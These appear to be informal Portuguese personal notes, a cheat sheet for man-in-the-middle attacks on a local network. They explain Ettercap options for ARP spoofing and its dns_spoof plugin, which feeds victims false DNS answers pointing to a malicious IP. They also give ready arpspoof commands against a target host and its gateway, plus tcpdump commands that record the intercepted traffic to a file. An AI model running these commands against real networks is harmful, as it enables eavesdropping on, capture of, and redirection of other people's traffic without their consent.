configurasao ettercap

salvar:    -w capture.pcap

-T: Indica que o Ettercap deve rodar em modo texto (terminal), sem a interface gráfica.

-i eth0: Especifica a interface de rede que o Ettercap deve usar. eth0 é um exemplo comum


-M arp:remote: Define o método de ataque como ARP spoofing. O arp:remote faz com que o Ettercap envie pacotes ARP falsificados para os alvos (neste caso, 192.168.0.1 e 192.168.0.2), 


-P dns_spoof: Ativa o plugin dns_spoof, que permite ao Ettercap interceptar requisições DNS da vítima e fornecer respostas DNS falsas, redirecionando o tráfego para um endereço IP malicioso


salvar 

sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -





capiturando com o arpspoof
==========================
Exemplo

ip do linux : 10.3.1.10

Endereço IPv4:  10.3.1.15

Gateway Padrão: 10.3.1.1
====================================

ip do linux :192.168.0.9

meu ip:  ipconfig

Endereço IPv4:  192.168.0.2

Gateway Padrão: 192.168.0.1


arpspoof -i eth0 -t <Endereço IPv4: 192.168.0.2>  -r <Gateway Padrão: 192.168.0.1> 


arpspoof -i eth0 -t 192.168.0.2 -r 192.168.0.1 


arpspoof -i eth0 -t 192.168.0.2 192.168.0.1




salvar 

sudo tcpdump -i eth0 -w capture.pcap



Capturar e salvar pacotes enquanto exibe na tela:

sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -



Para uma exibição mais detalhada ou filtros específicos, você pode ajustar o comando:

sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - -nn
